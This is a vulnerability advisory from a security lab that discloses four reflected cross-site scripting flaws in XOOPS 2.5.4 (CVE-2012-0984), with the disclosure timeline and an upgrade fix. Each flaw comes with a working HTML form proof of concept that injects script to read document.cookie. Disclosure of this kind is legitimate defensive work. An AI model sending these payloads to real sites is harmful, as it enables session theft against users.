@@ -1,0 +1,102 @@
+Advisory ID: HTB23062
+Product: XOOPS
+Vendor: xoops.org
+Vulnerable Version(s): 2.5.4  and probably prior
+Tested Version: 2.5.4 
+Vendor Notification: 7 December 2011 
+Vendor Patch: 22 February 2012 
+Public Disclosure: 18 April 2012 
+Vulnerability Type: XSS (Cross Site Scripting)
+CVE Reference(s): CVE-2012-0984
+Solution Status: Fixed by Vendor
+Risk Level: Medium 
+Credit: High-Tech Bridge SA Security Research Lab ( https://www.htbridge.com/advisory/ ) 
+
+-----------------------------------------------------------------------------------------------
+
+Advisory Details:
+
+High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in XOOPS, which can be exploited to perform Cross-Site Scripting (XSS) attacks.
+
+
+1) Multiple Cross-Site Scripting (XSS) in XOOPS: CVE-2012-0984
+
+1.1 Input passed via the "to_userid" POST parameter to /modules/pm/pmlite.php is not properly sanitised before being returned to the user.
+This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.
+
+The following PoC code is available:
+
+
+<form action='http://[host]/modules/pm/pmlite.php' method="post">
+<input type="hidden" name="sendmod" value='1'>
+<input type="hidden" name="to_userid" value='"><script>alert(document.cookie);</script>'>
+<input type="submit" value="submit" id="btn"> 
+</form>
+
+
+1.2 Input passed via the "current_file" POST parameter to /class/xoopseditor/tinymce/tinymce/jscripts/tiny_mce/plugins/xoopsimagemanager/xoopsimagebrowser.php is not properly sanitised before being returned to the user.
+This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.
+
+The following PoC code is available:
+
+
+<form action="http://[host]/class/xoopseditor/tinymce/tinymce/jscripts/tiny_mce/plugins/xoopsimagemanager/xoopsimagebrowser.php?target=1" method="post">
+<input type="hidden" name="isadmin" value='1'>
+<input type="hidden" name="catreadcount" value='1'>
+<input type="hidden" name="catwritecount" value='1'>
+<input type="hidden" name="current_file" value='"><script>alert(document.cookie);</script>'>
+<input type="submit" value="submit" id="btn"> 
+</form>
+
+
+1.3 Input passed via the "imgcat_id" POST parameter to /class/xoopseditor/tinymce/tinymce/jscripts/tiny_mce/plugins/xoopsimagemanager/xoopsimagebrowser.php is not properly sanitised before being returned to the user.
+This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.
+
+The following PoC code is available:
+
+
+<form action="http://[host]/class/xoopseditor/tinymce/tinymce/jscripts/tiny_mce/plugins/xoopsimagemanager/xoopsimagebrowser.php?target=1" method="post">
+<input type="hidden" name="isadmin" value='1'>
+<input type="hidden" name="catreadcount" value='1'>
+<input type="hidden" name="catwritecount" value='1'>
+<input type="hidden" name="imgcat_id" value='"><script>alert(document.cookie);</script>'>
+<input type="hidden" name="op" value='editcat'>
+<input type="submit" value="submit" id="btn"> 
+</form>
+
+
+1.4 Input passed via the "target" POST parameter to /class/xoopseditor/tinymce/tinymce/jscripts/tiny_mce/plugins/xoopsimagemanager/xoopsimagebrowser.php is not properly sanitised before being returned to the user.
+This can be exploited to execute arbitrary HTML and script code in a user's browser session in context of affected website.
+
+The following PoC code is available:
+ 
+
+<form action="http://[host]/class/xoopseditor/tinymce/tinymce/jscripts/tiny_mce/plugins/xoopsimagemanager/xoopsimagebrowser.php" method="post">
+<input type="hidden" name="isadmin" value='1'>
+<input type="hidden" name="catreadcount" value='1'>
+<input type="hidden" name="catwritecount" value='1'>
+<input type="hidden" name="target" value='"><script>alert(document.cookie);</script>'>
+<input type="submit" value="submit" id="btn"> 
+</form>
+
+
+-----------------------------------------------------------------------------------------------
+
+Solution:
+
+Upgrade to XOOPS 2.5.5 Final.
+
+More information:
+http://xoops.org/modules/news/article.php?storyid=6284
+
+-----------------------------------------------------------------------------------------------
+
+References:
+
+[1] High-Tech Bridge Advisory HTB23062 - https://www.htbridge.com/advisory/HTB23062 - Multiple XSS vulnerabilities in XOOPS. 
+[2] XOOPS - http://www.xoops.org/ - XOOPS is a web application platform written in PHP for the MySQL database. Its object orientation makes it an ideal tool for developing small or large community websites, intra company and corporate portals, weblogs and much more.
+[3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+
+-----------------------------------------------------------------------------------------------
+
+Disclaimer: The information provided in this Advisory is provided "as is" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.
